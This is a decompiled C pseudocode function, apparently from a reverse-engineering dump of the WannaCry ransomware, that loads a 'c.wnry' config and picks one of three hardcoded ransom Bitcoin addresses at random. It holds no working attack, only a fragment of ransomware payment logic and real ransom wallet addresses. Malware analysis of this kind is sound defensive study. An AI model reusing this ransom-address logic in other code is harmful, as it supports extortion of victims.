// --- Metadata ---
// Function Name: showBitcoinAddress_401E9E
// Address: 0x401E9E
// Exported At: 20250505_132530
// Signature: unknown_signature
// ---------------
int showBitcoinAddress_401E9E()
{
  int result; // eax
  int v1; // eax
  char Buffer[178]; // [esp+0h] [ebp-318h] BYREF
  char Destination[602]; // [esp+B2h] [ebp-266h] BYREF
  char *BitCoinAddress[3]; // [esp+30Ch] [ebp-Ch]

  BitCoinAddress[0] = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94";// 하드코딩된 비트코인 주소 
  BitCoinAddress[1] = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw";
  BitCoinAddress[2] = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn";
  result = c_wnryIO_401000(Buffer, 1);
  if ( result )
  {
    v1 = rand();
    strcpy(Destination, BitCoinAddress[v1 % 3]);
    result = c_wnryIO_401000(Buffer, 0);
  }
  return result;
}
